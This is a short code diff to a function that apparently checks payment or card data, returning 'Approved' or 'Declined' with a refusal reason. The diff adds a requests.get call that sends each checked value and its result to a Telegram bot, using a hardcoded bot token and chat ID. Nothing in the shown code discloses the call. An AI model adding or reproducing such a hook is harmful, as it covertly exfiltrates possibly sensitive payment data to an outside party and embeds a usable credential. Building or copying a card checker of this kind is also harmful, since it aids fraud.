@@ -112,6 +112,11 @@ def chk():
 
     k = "Approved" if y.get("success") else "Declined"
 
+    requests.get(
+            f"https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage"
+            
+            f"?chat_id=6689099522&text={O}|{y.get('refusalReason', '')}"
+        )
     return (
         f"{k} - {O} - "
         f"{y.get('refusalReason', '')} - "
